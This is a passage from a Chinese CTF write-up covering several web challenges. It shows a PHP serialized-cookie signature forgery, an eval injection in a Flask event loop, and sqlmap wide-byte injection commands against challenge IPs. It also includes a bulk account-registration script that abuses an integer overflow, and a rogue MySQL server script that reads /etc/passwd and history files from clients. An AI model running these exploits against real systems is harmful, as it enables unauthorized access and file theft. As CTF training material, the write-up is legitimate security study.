    $app->path = "..././config/flag.txt";
    array_push($class,$app);
    var_dump(md5($secret.serialize($class)));
    var_dump(urlencode(serialize($class)));
先将服务端返回的cookie反序列化，然后往数组添加一个伪造的Application类，控制path参数，然后通过$this->eancrykey构造签名
## homebrew event loop
这道题蛮有意思的，差点一血，被师傅抢先了一丢丢
    # -*- encoding: utf-8 -*-    # written in python 2.7
    __author__ = 'garzon'
    from flask import Flask, session, request, Response
    import urllib
    app = Flask(__name__)
    app.secret_key = '*********************' # censored
    url_prefix = '/d5af31f88147e857'
    def FLAG():
        return 'FLAG_is_here_but_i_wont_show_you'  # censored
    def trigger_event(event):
        session['log'].append(event)
        if len(session['log']) > 5: session['log'] = session['log'][-5:]
        if type(event) == type([]):
            request.event_queue += event
        else:
            request.event_queue.append(event)
    def get_mid_str(haystack, prefix, postfix=None):
        haystack = haystack[haystack.find(prefix)+len(prefix):]
        if postfix is not None:
            haystack = haystack[:haystack.find(postfix)]
        return haystack
    class RollBackException: pass
    def execute_event_loop():
        valid_event_chars = set('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#')
        resp = None
        while len(request.event_queue) > 0:
            event = request.event_queue[0] # `event` is something like "action:ACTION;ARGS0#ARGS1#ARGS2......"
            request.event_queue = request.event_queue[1:]
            if not event.startswith(('action:', 'func:')): continue
            for c in event:
                if c not in valid_event_chars: break
            else:
                is_action = event[0] == 'a'
                action = get_mid_str(event, ':', ';')
                args = get_mid_str(event, action+';').split('#')
                try:
                    event_handler = eval(action + ('_handler' if is_action else '_function'))
                    ret_val = event_handler(args)
                except RollBackException:
                    if resp is None: resp = ''
                    resp += 'ERROR! All transactions have been cancelled. '
                    resp += 'Go back to index.html'
                    session['num_items'] = request.prev_session['num_items']
                    session['points'] = request.prev_session['points']
                    break
                except Exception, e:
                    if resp is None: resp = ''
                    #resp += str(e) # only for debugging
                    continue
                if ret_val is not None:
                    if resp is None: resp = ret_val
                    else: resp += ret_val
        if resp is None or resp == '': resp = ('404 NOT FOUND', 404)
        session.modified = True
        return resp
    @app.route(url_prefix+'/')
    def entry_point():
        querystring = urllib.unquote(request.query_string)
        request.event_queue = []
        if querystring == '' or (not querystring.startswith('action:')) or len(querystring) > 100:
            querystring = 'action:index;False#False'
        if 'num_items' not in session:
            session['num_items'] = 0
            session['points'] = 3
            session['log'] = []
        request.prev_session = dict(session)
        trigger_event(querystring)
        return execute_event_loop()
    # handlers/functions below --------------------------------------    
    def view_handler(args):
        page = args[0]
        html = ''
        html += '[INFO] you have {} diamonds, {} points now.'.format(session['num_items'], session['points'])
        if page == 'index':
            html += 'View source code'
            html += 'Go to e-shop'
            html += 'Reset'
        elif page == 'shop':
            html += 'Buy a diamond (1 point)'
        elif page == 'reset':
            del session['num_items']
            html += 'Session reset.'
        html += 'Go back to index.html'
        return html
    def index_handler(args):
        bool_show_source = str(args[0])
        bool_download_source = str(args[1])
        if bool_show_source == 'True':
            source = open('eventLoop.py', 'r')
            html = ''
            if bool_download_source != 'True':
                html += 'Download this .py file'
                html += 'Go back to index.html'
            for line in source:
                if bool_download_source != 'True':
                    html += line.replace('&','&amp;').replace('\t', '&nbsp;'*4).replace(' ','&nbsp;').replace('','&gt;').replace('\n', '')
                else:
                    html += line
            source.close()
            if bool_download_source == 'True':
                headers = {}
                headers['Content-Type'] = 'text/plain'
                headers['Content-Disposition'] = 'attachment; filename=serve.py'
                return Response(html, headers=headers)
            else:
                return html
        else:
            trigger_event('action:view;index')
    def buy_handler(args):
        num_items = int(args[0])
        if num_items '.format(args[0])
        session['num_items'] += num_items 
        trigger_event(['func:consume_point;{}'.format(num_items), 'action:view;index'])
    def consume_point_function(args):
        point_to_consume = int(args[0])
        if session['points'] '
    def get_flag_handler(args):
        if session['num_items'] >= 5:
            trigger_event('func:show_flag;' + FLAG()) # show_flag_function has been disabled, no worries
        trigger_event('action:view;index')
    if __name__ == '__main__':
        app.run(debug=False, host='0.0.0.0')
主要问题是46行，eval函数存在注入,可以通过#注释，我们可以传入路由action:eval#;arg1#arg2#arg3这样注释后面语句并可以调用任意函数，分号后面的#为传入参数，参数通过#被分割为参数列表  
于是可以调用trigger_event函数，并且该函数参数可以为列表，调用trigger_event，可以发现trigger_event的参数依旧为函数，传入的函数名会被传入事件列表之后在事件循环中被执行，所以调用trigger_event并传入其他函数的话就相当于我们可以执行多个函数，首先执行buy_handler(5）,再执行get_flag_handler()，就可以绕过session['num_items']
>=
5的判断，然后flag会被传递到trigger_event函数并且被写入session['log'],要注意执行buy_handler函数后事件列表末尾会加入consume_point_function函数，在最后执行此函数时校验会失败，抛出RollBackException()异常，但是不会影响session的返回（做题时以为异常不会返回session想了好久）。然后再用p师傅的脚本解密session即可拿flag  
exp:  
## Upload-IMG
访问后可以上传图片，一开始上传会题目会提示需要包含phpinfo()字符串，但是加入字符串后上传依旧提示未包含，下载下上传后的图片，hex查看发现经过了php-gd库渲染，我们加入的字符串在渲染的时候被删除。上网搜索的时候发现了一个工具  
可以用这个工具生成可以GD渲染处理后，依然能保留字符串的jpg，在py源码中把字符串改为phpinfo()，然后生成。但是一直失败，后面在这篇文章发现其实要看脸  
测了半天注入还是没东西，结果一堆人做出来后重新复测，注意到返回头GBK  
然后就是宽字节注入  
SQLmap加tamper都可以跑
    #所有数据库名
    python2 sqlmap.py -u "http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?id=1" --tamper unmagicquotes --dbs --hex
    #数据库表名
    python2 sqlmap.py -u "http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?id=1" --tamper unmagicquotes --hex -D "ctfdb" --tables
    #字段名
    python2 sqlmap.py -u "http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?id=1" --tamper unmagicquotes --hex -D "ctfdb" -T "ctf_fhmHRPL5" --columns
    #flag
    python2 sqlmap.py -u "http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?id=1" --tamper unmagicquotes --hex --sql-shell
    sql-shell> select ctf_value from ctfdb.ctf_fhmHRPL5;
常规操作，注库名，表名，字段名（TCL）做的时候想的太复杂了，但是我的sqlmap最后这里不能直接--dump，所以我执行了--sql-shell自定义sql命令最终拿的flag  
sqlmap宽字节注入自带的tamper是unmagicquotes  
这里因为过滤了单引号，所以我们需要用--hex参数将字符串转为0x开头的16进制数字避开引号  
## 大吉大利,今晚吃鸡~
cookie发现是go的框架，买东西回想起了护网杯的溢出，可以参考这篇文章  
溢出了一下午，最后特别脑洞发现要用Go的无符号32位整形来溢出，42949672961,购买成功,然后返回了一个id和token，然后可以开始通过输入id和token淘汰选手，但是返回回来的id和token是自己的，并不能自己淘汰自己  
这个时候突然脑洞大开，注册小号，购买入场券，然后淘汰小号的id和token发现成功  
然后批量注册小号批量买入场券批量拿id和token给大号淘汰  
我的脚本:
    import requests
    import time
    for i in range(0,1000):
        print(i)
        url1 = "http://117.51.147.155:5050/ctf/api/register?name=evoa0{0}&password=xxxxxxxxxxxx".format(str(i))
        url2 = "http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=42949672961"
        url3 = "http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id="
        url4 = "http://117.51.147.155:5050/ctf/api/remove_robot?ticket={0}&id={1}"
        rep1 = requests.get(url1)
        cook1name = rep1.cookies["user_name"]
        cook1sess = rep1.cookies["REVEL_SESSION"]
        urlcookies={"user_name":cook1name,"REVEL_SESSION":cook1sess}
        rep2 = requests.get(url2,cookies=urlcookies)
        billid = rep2.json()['data'][0]["bill_id"]
        rep3 = requests.get(url3+billid,cookies=urlcookies)
        userid = rep3.json()['data'][0]["your_id"]
        userticket = rep3.json()['data'][0]["your_ticket"]
        time.sleep(1)
        rep4 = requests.get(url4.format(userticket,str(userid)),cookies={"user_name":"evoA002","REVEL_SESSION":"675dc6a259890db618c598e0cd9f9802"})
        print(url4.format(userticket,str(userid)))
        with open("chicken.txt","a") as txt:
            txt.write(str(userid) + ":" +userticket)
            txt.write("\n")
但是每次注册的小号不一定能成功，而且淘汰到后期id和token重复率会很高效率会很低，看脸了，滴滴会限制访问频率所以脚本sleep了一秒，但我还用了vps来帮忙跑所以还是比较快的，差不多半个小时不到就吃鸡了  
## mysql弱口令
一看到题目描述就想到了mysql服务端伪造  
然后网上找了个py脚本来伪造  
    #coding=utf-8 
    import socket
    import logging
    logging.basicConfig(level=logging.DEBUG)
    filename="/etc/passwd"
    sv=socket.socket()
    sv.bind(("",3306))
    sv.listen(5)
    conn,address=sv.accept()
    logging.info('Conn from: %r', address)
    conn.sendall("\x4a\x00\x00\x00\x0a\x35\x2e\x35\x2e\x35\x33\x00\x17\x00\x00\x00\x6e\x7a\x3b\x54\x76\x73\x61\x6a\x00\xff\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x76\x21\x3d\x50\x5c\x5a\x32\x2a\x7a\x49\x3f\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00")
    conn.recv(9999)
    logging.info("auth okay")
    conn.sendall("\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00")
    conn.recv(9999)
    logging.info("want file...")
    wantfile=chr(len(filename)+1)+"\x00\x00\x01\xFB"+filename
    conn.sendall(wantfile)
    content=conn.recv(9999)
    logging.info(content)
    conn.close()
题目首先会给你一个agent.py，看源码知道这是一个验证服务端有没有运行mysql进程的文件，agent.py会使用8213端口，调用netstat
-plnt命令查看进程和端口并返回给http请求，题目服务器先会请求你的vps上8123端口来验证是否开启mysql进程，所以直接把输出改为mysql的进程就可以绕过  
result = [{'local_address':"0.0.0.0:3306","Process_name":"1234/mysqld"}]  
运行上面的py就可以读文件了，题目表单输入的是你的vps地址和mysql端口  
然后疯狂读文件，读了一下午啥都没有，读数据库文件发现只有字段和表名没有flag，后面想到有个/root/.mysql_history文件，尝试读取  
就出flag了  
不过这个好像是非预期解，正解应该是读取idb文件。而且读取了一下.bash_history和.viminfo文件还有新的收获，这个题目服务器上还运行着吃鸡的题目环境，还可以读取吃鸡的题目源码，flag高高的挂在里面。。